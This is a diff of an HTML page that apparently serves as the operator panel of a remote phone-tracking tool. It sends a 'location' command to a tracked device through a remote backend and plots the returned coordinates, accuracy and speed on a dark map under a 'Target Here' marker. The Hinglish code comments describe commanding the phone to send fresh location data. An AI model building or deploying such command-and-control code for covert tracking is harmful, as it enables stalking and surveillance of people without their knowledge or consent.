@@ -1,70 +1,225 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Location - Admin Panel</title>
+    <title>Location Tracker</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    
     <style>
+        :root {
+            --bg-color: #0f0f0f;
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text-main: #ffffff;
+            --cyan: #00f3ff;
+            --accent: #4caf50;
+        }
+
         body {
-            margin: 0;
-            background: #000;
-            color: white;
-            font-family: sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column; height: 100vh;
         }
 
-        .top-bar {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            z-index: 10;
-            display: flex;
-            gap: 15px;
+        /* HEADER */
+        .header {
+            position: absolute; top: 20px; left: 50%; transform: translateX(-50%);
+            width: 90%; max-width: 450px; z-index: 1000;
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px);
+            border-radius: 20px; padding: 15px;
+            border: 1px solid var(--glass-border);
+            display: flex; justify-content: space-between; align-items: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
-        .card {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 10px 20px;
-            border-radius: 30px;
-            border: 1px solid #00ff88;
+        .back-btn { color: white; font-size: 1.2rem; text-decoration: none; }
+        .title { font-weight: bold; color: var(--cyan); letter-spacing: 1px; }
+        
+        /* MAP CONTAINER */
+        #map { height: 100%; width: 100%; z-index: 1; }
+
+        /* BOTTOM INFO PANEL */
+        .info-panel {
+            position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);
+            width: 90%; max-width: 450px; z-index: 1000;
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px);
+            border-radius: 25px; padding: 20px;
+            border: 1px solid var(--cyan);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
         }
 
-        iframe {
-            width: 100vw;
-            height: 100vh;
-            border: none;
-        }
+        .coords-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
+        .data-box { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 10px; text-align: center; }
+        .lbl { font-size: 0.6rem; color: #aaa; text-transform: uppercase; }
+        .val { font-size: 0.9rem; font-weight: bold; color: white; }
 
-        .back-btn {
-            background: #00ff88;
-            color: black;
-            padding: 10px 15px;
-            border-radius: 50%;
-            text-decoration: none;
+        /* BUTTONS */
+        .action-row { display: flex; gap: 10px; }
+        .btn {
+            flex: 1; padding: 12px; border: none; border-radius: 12px;
+            font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+            transition: 0.3s;
         }
+        .btn-refresh { background: var(--glass-bg); color: white; border: 1px solid var(--glass-border); }
+        .btn-refresh:hover { background: rgba(255,255,255,0.2); }
+        
+        .btn-maps { background: var(--cyan); color: black; box-shadow: 0 0 15px var(--cyan); }
+        .btn-maps:hover { transform: translateY(-2px); box-shadow: 0 0 25px var(--cyan); }
+
+        .last-seen { text-align: center; font-size: 0.7rem; color: #888; margin-top: 10px; }
     </style>
 </head>
-
 <body>
-    <div class="top-bar">
+
+    <div class="header">
         <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-        <div class="card"><i class="fa-solid fa-location-crosshairs"></i> <span id="coords">Fetching Location...</span>
+        <div class="title"><i class="fa-solid fa-location-crosshairs"></i> LIVE TRACKER</div>
+        <div style="width: 20px;"></div> </div>
+
+    <div id="map"></div>
+
+    <div class="info-panel">
+        <div class="coords-grid">
+            <div class="data-box">
+                <div class="lbl">Latitude</div>
+                <div class="val" id="lat">--</div>
+            </div>
+            <div class="data-box">
+                <div class="lbl">Longitude</div>
+                <div class="val" id="lon">--</div>
+            </div>
+            <div class="data-box">
+                <div class="lbl">Accuracy</div>
+                <div class="val" id="acc">--</div>
+            </div>
+            <div class="data-box">
+                <div class="lbl">Speed</div>
+                <div class="val" id="spd">0 km/h</div>
+            </div>
         </div>
+
+        <div class="action-row">
+            <button class="btn btn-refresh" onclick="fetchLocation()">
+                <i class="fa-solid fa-rotate"></i> Update
+            </button>
+            <button class="btn btn-maps" onclick="openGoogleMaps()">
+                <i class="fa-solid fa-map-location-dot"></i> Google Maps
+            </button>
+        </div>
+        
+        <div class="last-seen" id="lastUpdate">Waiting for signal...</div>
     </div>
 
-    <iframe id="map" src="https://maps.google.com/maps?q=0,0&z=2&output=embed"></iframe>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
     <script>
-        // Ye function server se aane wale lat/lng ko map pe dikhayega
-        function updateMap(lat, lng) {
-            document.getElementById('coords').innerText = lat + ", " + lng;
-            document.getElementById('map').src = `https://maps.google.com/maps?q=${lat},${lng}&z=16&output=embed`;
+        const API_BASE = 'https://child-v9no.onrender.com';
+        
+        // 1. URL se ID uthao
+        const urlParams = new URLSearchParams(window.location.search);
+        const DEVICE_ID = urlParams.get('id');
+
+        // Map Setup
+        let map = L.map('map').setView([20.5937, 78.9629], 5); // Default India center
+        let marker;
+
+        // Dark Theme Tiles (Hacker Look)
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+            attribution: '&copy; OpenStreetMap &copy; CartoDB',
+            subdomains: 'abcd',
+            maxZoom: 20
+        }).addTo(map);
+
+        // Custom Marker Icon
+        const icon = L.divIcon({
+            className: 'custom-div-icon',
+            html: "<div style='background-color:#00f3ff; width:15px; height:15px; border-radius:50%; box-shadow:0 0 15px #00f3ff; border:2px solid white;'></div>",
+            iconSize: [20, 20],
+            iconAnchor: [10, 10]
+        });
+
+        // 2. Fetch Location Logic
+        async function fetchLocation() {
+            const btn = document.querySelector('.btn-refresh');
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Updating...';
+
+            try {
+                // Pehle command bhejo taaki phone fresh location bheje
+                await fetch(`${API_BASE}/api/send-command`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: DEVICE_ID, command: 'location' })
+                });
+
+                // 2 second wait karke data fetch karo
+                setTimeout(async () => {
+                    const res = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/location?t=${Date.now()}`);
+                    const data = await res.json();
+                    
+                    // Agar data list hai, toh latest wala lo
+                    const loc = Array.isArray(data) ? data[data.length - 1] : data;
+
+                    if (loc && loc.lat) {
+                        updateMap(loc.lat, loc.lon, loc.accuracy, loc.speed, loc.time);
+                    } else {
+                        document.getElementById('lastUpdate').innerText = "No location data found yet.";
+                    }
+                    
+                    btn.innerHTML = '<i class="fa-solid fa-rotate"></i> Update';
+                }, 3000); // 3 sec delay for device to upload
+
+            } catch (err) {
+                console.error(err);
+                btn.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i> Error';
+            }
         }
 
-        // Example test
-        setTimeout(() => updateMap(28.6139, 77.2090), 3000);
+        // 3. Update UI
+        function updateMap(lat, lon, acc, spd, time) {
+            // Text Update
+            document.getElementById('lat').innerText = parseFloat(lat).toFixed(4);
+            document.getElementById('lon').innerText = parseFloat(lon).toFixed(4);
+            document.getElementById('acc').innerText = acc ? Math.round(acc) + " m" : "--";
+            document.getElementById('spd').innerText = spd ? Math.round(spd * 3.6) + " km/h" : "0 km/h";
+            
+            const timeStr = new Date(parseInt(time)).toLocaleString();
+            document.getElementById('lastUpdate').innerText = "Last Updated: " + timeStr;
+
+            // Map Update
+            const newLatLng = [lat, lon];
+            map.flyTo(newLatLng, 16, { animate: true, duration: 1.5 });
+
+            if (marker) {
+                marker.setLatLng(newLatLng);
+            } else {
+                marker = L.marker(newLatLng, { icon: icon }).addTo(map)
+                    .bindPopup(`<b>Target Here</b><br>${timeStr}`).openPopup();
+            }
+        }
+
+        // Open in Google Maps App
+        function openGoogleMaps() {
+            const lat = document.getElementById('lat').innerText;
+            const lon = document.getElementById('lon').innerText;
+            if(lat === '--') return alert("Wait for location to load!");
+            
+            window.open(`https://www.google.com/maps/search/?api=1&query=${lat},${lon}`, '_blank');
+        }
+
+        // Start
+        window.onload = () => {
+            if(!DEVICE_ID) {
+                alert("No ID provided!");
+                window.location.href = 'index.html';
+                return;
+            }
+            fetchLocation();
+        };
+
     </script>
 </body>
-
 </html>
